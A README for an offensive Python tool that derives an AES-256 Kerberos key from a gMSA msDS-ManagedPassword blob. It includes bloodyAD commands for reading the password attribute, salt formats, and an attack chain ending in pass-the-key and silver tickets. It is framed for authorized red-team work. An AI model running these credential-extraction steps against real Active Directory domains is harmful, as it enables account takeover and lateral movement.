# gmsa-aes-key-extractor

> Derive a valid AES-256 Kerberos key from a gMSA `msDS-ManagedPassword` blob using Impacket — for authorized Active Directory security research and red team operations.

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](./LICENSE)
[![Python](https://img.shields.io/badge/Python-3.8%2B-blue)](https://www.python.org/)
[![Security Research](https://img.shields.io/badge/Use-Authorized%20Testing%20Only-red)]()

---

## Overview

`gmsa-aes-key-extractor` is a focused offensive security utility that extracts the **AES-256 Kerberos key** from a Windows **Group Managed Service Account (gMSA)** managed password blob.

When retrieved via LDAP by an authorized principal, the `msDS-ManagedPassword` attribute contains a binary blob encoding the account's current managed password. This tool decodes that blob, parses the raw UTF-16LE password bytes, and runs them through Impacket's `string_to_key` to produce a usable AES-256-CTS Kerberos key — ready for pass-the-key or further Kerberos abuse in a pentest engagement.

---

## Requirements

- Python 3.8+
- [Impacket](https://github.com/fortra/impacket)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD) *(for blob retrieval)*
- `proxychains` *(optional, for internal/pivoted networks)*

Install Python dependencies:

```bash
pip install impacket
```

---

## Installation

```bash
git clone https://github.com/ben-slates/gmsa-aes-key-extractor.git
cd gmsa-aes-key-extractor
pip install impacket
```

---

## Usage

### Step 1 — Retrieve the `msDS-ManagedPassword` Blob

Use `bloodyAD` to fetch the attribute from the target gMSA object. You must be authenticated as a principal with read rights on `msDS-ManagedPassword`.

**Direct network access:**

```bash
bloodyAD --host dc2.domain.something -d DOMAIN -u username -k \
  get object 'accountname_gMSA$' --attr msDS-ManagedPassword
```

**Through a pivot — internal network via proxychains:**

```bash
proxychains bloodyAD --host dc2.domain.something -d DOMAIN -u username -k \
  get object 'accountname_gMSA$' --attr msDS-ManagedPassword
```

> The `-k` flag uses Kerberos authentication. Replace `dc2.domain.something`, `DOMAIN`, `username`, and `accountname_gMSA$` with your target values.

Copy the Base64 value from the `msDS-ManagedPassword` field in the output for the next step.

---

### Step 2 — Derive the AES-256 Key

```bash
python gmsa_aes.py
```

```
Enter the base64 string: <paste Base64 blob here>
Enter the salt value: DOMAIN.SOMETHINGaccountname_gMSA$
AES256 Key: 3a1f8c9b4d2e7f0a1c5b9e3d6a2f4c8e9f1d3b7a...
```

---

## Salt Format

The Kerberos salt used for AES key derivation depends on the **account type**. Two formats apply for gMSA accounts:

### Format 1 — Standard User-style gMSA (most common)

Follows the standard Kerberos convention of realm + sAMAccountName:

```
UPPERCASE.FQDN + sAMAccountName (including the $)
```

Example — domain `corp.local`, account `svc_web_gMSA$`:

```
CORP.LOCALsvc_web_gMSA$
```

### Format 2 — Host-based / Service Principal gMSA

For gMSA accounts configured as host-based Kerberos principals, the salt follows the host principal convention per [RFC 4120](https://www.rfc-editor.org/rfc/rfc4120):

```
UPPERCASE.FQDN + "host" + fully.qualified.account.hostname
```

Example — realm `CORP.LOCAL`, account `svc_web_gMSA` with FQDN `svc_web_gmsa.corp.local`:

```
CORP.LOCALhostsvc_web_gmsa.corp.local
```

> **Which format to use?** Try Format 1 first. If the derived key does not authenticate correctly, try Format 2. The correct format depends on how the gMSA's `servicePrincipalName` and Kerberos salt attributes are configured in Active Directory.

---

## Typical Attack Chain

```
1. Compromise a principal listed in msDS-GroupMSAMembership
         |
         v
2. Retrieve msDS-ManagedPassword blob via bloodyAD
   (direct or through proxychains for internal networks)
         |
         v
3. Feed Base64 blob + Kerberos salt into gmsa_aes.py
         |
         v
4. AES-256 Key -> Pass-the-Key / Kerberos Silver Ticket / lateral movement
```

---

## Ethical & Legal Disclaimer

This tool is intended **exclusively** for:

- Authorized penetration testing engagements
- Red team operations with written scope approval
- Active Directory security research in controlled lab environments
- Defensive detection engineering and blue team awareness

**Unauthorized use against systems you do not own or have explicit written permission to test is illegal** and may violate the CFAA, CMA, or equivalent legislation in your jurisdiction. The author assumes no liability for misuse.

---

## References

- [Microsoft — MSDS-MANAGEDPASSWORD_BLOB structure](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e)
- [bloodyAD by CravateRouge](https://github.com/CravateRouge/bloodyAD)
- [Impacket by Fortra](https://github.com/fortra/impacket)
- [gMSA Abuse Research — cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [Kerberos AES Key Derivation — RFC 3962](https://www.rfc-editor.org/rfc/rfc3962)
- [Kerberos Principal & Salt — RFC 4120](https://www.rfc-editor.org/rfc/rfc4120)

---

## License

See [LICENSE](./LICENSE) &nbsp;|&nbsp; [Brand & Visual Identity](./brand.md)

---

*© 2026 Ben C. All rights reserved. Licensed under the MIT License.*
